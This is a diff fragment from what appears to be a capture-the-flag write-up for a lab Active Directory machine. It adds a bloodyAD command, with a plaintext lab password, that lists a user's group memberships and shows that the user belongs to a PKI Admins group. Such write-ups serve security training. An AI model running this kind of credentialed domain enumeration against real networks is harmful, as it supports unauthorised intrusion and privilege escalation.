@@ -903,5 +903,25 @@ evil-winrm-py PS C:\Users\e.black\Desktop>
 
 And now its at this point where i can get the user flag
 
+```python
+❯❯❯ bloodyAD --host dc01.coder.htb -d coder.htb -u e.black -p 'ypOSJXPqlDOxxbQSfEERy300' get membership 'e.black'
+
+distinguishedName: CN=Users,CN=Builtin,DC=coder,DC=htb
+objectSid: S-1-5-32-545
+sAMAccountName: Users
+
+distinguishedName: CN=Remote Management Users,CN=Builtin,DC=coder,DC=htb
+objectSid: S-1-5-32-580
+sAMAccountName: Remote Management Users
+
+distinguishedName: CN=Domain Users,CN=Users,DC=coder,DC=htb
+objectSid: S-1-5-21-2608251805-3526430372-1546376444-513
+sAMAccountName: Domain Users
+
+distinguishedName: CN=PKI Admins,CN=Users,DC=coder,DC=htb
+objectSid: S-1-5-21-2608251805-3526430372-1546376444-2101
+sAMAccountName: PKI Admins
+```
+
 
 
